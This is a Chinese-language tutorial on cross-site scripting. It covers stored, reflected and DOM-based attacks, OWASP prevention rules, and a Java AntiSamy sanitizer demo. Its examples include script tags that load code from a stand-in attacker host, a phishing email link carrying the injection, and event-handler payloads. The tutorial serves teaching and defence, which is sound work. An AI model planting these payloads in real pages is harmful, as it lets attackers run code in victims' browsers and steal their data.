

# 跨站脚本攻击(XSS - Cross Site Scripting)


* Acunetix_Web_Vulnerability_Scanner_V9
* arachni-0.4.2-0.4
* Pangolin_jb51.rar

## 原理
Web程序将数据直接作为HTML显示（未进行HTML特殊字符转义、script脚本过滤），在浏览器端显示的这些内容的时候，激活其中包含的JavaScript恶意脚本，这些脚本可以用来获取用户敏感信息，追踪用户浏览历史、将用户诱导至其他网站等。

更多攻击方式请参考：《[XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)》

## 分类

|风险代码存在于？|数据库中|HTTP响应中|浏览器构建的DOM中|
|---|---|---|---|
|Stored XSS Attacks     |Yes|Yes|Yes|
|Reflected XSS Attacks  |   |Yes|Yes|
|DOM Based XSS          |   |   |Yes|



### Stored XSS Attacks
风险代码被先持久存储于服务器上（比如：数据库中），然后再读取出来显示到浏览器。比如在博客上发表文章、发表评论。

攻击流程示例：

1. 恶意用户A发现某个博客系统B对博文的评论未做严格检查，而允许注入Javascript代码。
1. 恶意用户A找到一个知名度高的一篇访问量大的博文，发表以下评论代码：

    ```html
    <script src="http://a.com/xss.js"></script>
    楼主的帖子实在是写得太好了。文笔流畅,修辞得体,深得魏晋诸朝遗风,
    更将唐风宋骨发扬得入木三分,能在有生之年看见楼主的这个帖子。
    实在是我三生之幸啊。......
    ```

1. 博客系统B使用以下方式显示回帖（JSP语法）：

    ```jsp
    回帖人：<%=comment.userId %>，回帖内容是：<%= comment.content %>
    ```

1. 后果：每个读此博文并看到该评论的受害者都会加载并执行其中的恶意代码。


### Reflected XSS Attacks
风险代码并没有被持久存储，而是在服务器端转了一圈之后就直接显示在生成的动态HTML中。
这种攻击方式常被以HTML邮件的方式发送给潜在受害者。

攻击流程示例：

1. 恶意用户A搜索、验证并确信某系统B在访问 <code>http://b.com/welcome.do?user=zhang3</code> 时，是以以下方式显示URL中的用户名的（JSP语法）：

    ```jsp
    welcome <%=param["user"] %>!
    ```
1. 恶意用户A就利用此漏洞，以系统B的名义向多个用户发送包含以下连接的HTML邮件，并诱导用户点击该链接：

    ```html
    {系统B}温馨提醒您：XXX 想加您好友，请点击
    <a href="http://b.com/welcome.do?user=zhang3<script src='http://a.com/xss.js'></script>">此处</a>
    进行处理！
    ```

1. 后果：受害者在阅读该邮件并点击此链接后，在浏览系统B的欢迎画面时，就会加载并执行来自于 a.com 的恶意脚本



### DOM Based XSS
这种方式与 Reflected XSS Attacks 比较相似，但区别在于：在Reflected XSS Attacks 中，恶意代码时有缺陷的系统在返回给浏览器端之间就加入到生成的HTML中了（比如通过JSP、PHP等）；而在 DOM Based XSS 中，恶意代码是在浏览器端通过有缺陷的JavaScript代码在动态修改DOM树时加入的。

也即，在 Reflected XSS Attacks 的攻击流程示例的第二步中的代码替换为以下方式：

```html
 welcome <script>
document.write(document.location.href.substring(document.location.href.indexOf("user=")+5));
</script>!
```

与前两种的区别是：前两种最终会将风险代码写在生成HTML中，而这一种是服务器端返回的HTML本身并不包含风险代码，但是其中的JavaScript脚本在动态修改DOM时，未对输出值做充分的安全检查。


注入点 

1. 客户端：来自用户输入，却未作安全检查。

    ```html
    <img src="https://www.owasp.org/skins/monobook/ologo.png" onload="alert('XSS');" >
    ```

2. 服务器端：来自配置文件，却未作安全检查（比如消息模板，头部文件）

## 防范XSS
在Web应用中，XSS缺陷很难确认和移除，一些漏洞扫描工具也只能对浅层的扫描。最好的方式就是针对安全展开代码Review，并对所有来自HTTP请求的数据进行检查，如果请求中的数据有可能最终作为HTML显示，就需要做相应的处理。

## 检查列表
这里仅仅给出了部分摘要，更详尽列表请参看 《[XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)》：

1. RULE #0 - 不信任的数据只能插入到允许的位置。 示例代码：

    ```
      <script>...NEVER PUT UNTRUSTED DATA HERE...</script>   直接放到script中
      &lt;!--...NEVER PUT UNTRUSTED DATA HERE...-->             在HTML注释中
      <div ...NEVER PUT UNTRUSTED DATA HERE...=test />       在属性名中
      <NEVER PUT UNTRUSTED DATA HERE... href="/test" />      在标签名中
      <style>...NEVER PUT UNTRUSTED DATA HERE...</style>     直接在CSS中
    ```


1. RULE #1 - 插入HTML内容时要先转义。HTML特殊字符转义有：
    
    ```
     & --> &amp
     < --> &lt; 
     > --> &gt; 
     " --> &quot; 
     ' --> &#x27; 
     / --> &#x2F; 这里包含了斜杠，因为它在结束一个标签时有用
    ```


1. RULE #2 - 插入标签的属性值前要先转义
1. RULE #3 - 将不信任的数据插入到JavaScript前要先转义
1. RULE #3.1 - 在HTML中对JSON的值进行HTML转义，以及使用 JSON.parse 读取数据
1. RULE #4 - 对CSS转义，以及对HTML元素的sytle设置值前要进行充分的检查
1. RULE #5 - 在插入URL数据前要先URL转义
1. RULE #6 - 在输出用户输入的HTML内容时，要使用HTML策略引擎进行验证或移除其中的风险代码
1. RULE #7 - 要预防 DOM-based XSS
1. RULE #8 - 使用 [HTTPOnly cookie](https://www.owasp.org/index.php/HTTPOnly)



## DOM Based XSS 检查列表
[参考](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)

1. RULE #1 - 在可以执行JavaScript的环境中，要对不信任的数据先 HTML 转义，再 JavaScript 转义
1. RULE #2 - 在可以执行JavaScript的环境中，为HTML元素的属性设置值前要先进行 JavaScript 转义
1. RULE #3 - 在可以执行JavaScript的环境中，设置事件处理函数等地方需要特别注意
1. RULE #4 - 在插入CSS属性时需要先进行 JavaScript 转义
1. RULE #5 - 在插入URL前要先进行URL转义


## 工具
* [OWASP Java HTML Sanitizer Project](https://www.owasp.org/index.php/OWASP_Java_HTML_Sanitizer_Project)
* [OWASP AntiSamy](https://www.owasp.org/index.php/Category:OWASP_AntiSamy_Project)
* [Nikto2](http://www.cirt.net/nikto2) - 开源的Web服务器扫描工具
* [nessus](http://www.tenable.com/products/nessus) - 漏洞扫描工具
* [Microsoft Web Protection Library](http://wpl.codeplex.com/) - .Net 平台下的安全工具
* [ValidateRequest](http://msdn.microsoft.com/en-us/library/ms972969.aspx#securitybarriers_topic6) - .Net 平台内建功能，可以提供部分安全保护措施
* [OWASP ESAPI](https://www.owasp.org/index.php/ESAPI) - OWASP Enterprise Security API


## OWASP Java HTML Sanitizer Project 使用示例

参考 [这里](https://github.com/btpka3/btpka3.github.com/blob/master/owasp/first-AntiSamy/src/main/java/me/test/AntiSamyTest.java)


## OWASP AntiSamy 使用示例

pom.xml

```xml
<dependency>
    <groupId>org.owasp.antisamy</groupId>
    <artifactId>antisamy</artifactId>
    <version>1.5.2</version>
</dependency>
```

AntiSamyDemo.java

```java
import java.io.IOException;
import java.io.InputStream;

import org.owasp.validator.html.AntiSamy;
import org.owasp.validator.html.CleanResults;
import org.owasp.validator.html.Policy;
import org.owasp.validator.html.PolicyException;
import org.owasp.validator.html.ScanException;

public class AntiSamyDemo {

    public static void main(String[] args) throws PolicyException, IOException, ScanException {

        InputStream prolicyIn = AntiSamyDemo.class.getResourceAsStream("antisamy-ebay-1.4.4.xml");
        Policy policy = Policy.getInstance(prolicyIn);
        AntiSamy as = new AntiSamy();
        String drityInput = "<script>alert(1)</script>"
                + "<a href='#bb' style='z-index:999; width:100%;' onclick='xxx'>aa</a>"
                + "<iframe src='javascript:xxx'></iframe>"
                + "<xxx>xxx</xxx>";

        // 输出： <a href="#bb" style="width: 100.0%;">aa</a> xxx
        CleanResults cr = as.scan(drityInput, policy, AntiSamy.SAX);
        String cleanResult = cr.getCleanHTML();
        System.out.println(cleanResult);
    }
}
```


参考：
* [Cross site Scripting](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
* [XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [各种工具使用demo](https://github.com/btpka3/btpka3.github.com/blob/master/owasp/first-AntiSamy/src/main/java/me/test/Test123.java)
* 淘宝的 [HTML 白名单](http://open.taobao.com/doc/detail.htm?id=102538)、[CSS 白名单](http://open.taobao.com/doc/detail.htm?id=102539)

